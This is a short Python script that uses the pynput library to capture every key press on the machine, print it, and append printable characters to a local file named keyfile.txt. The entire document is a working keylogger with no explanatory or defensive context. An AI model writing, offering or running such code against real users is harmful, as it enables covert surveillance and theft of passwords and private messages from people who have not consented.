
from pynput import keyboard
def keyPress(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            c= key.char
            logKey.write(c)
        except:
            print("Special char Error")

if __name__ == "__main__":
    listen = keyboard.Listener(on_press=keyPress)
    listen.start()
    input()
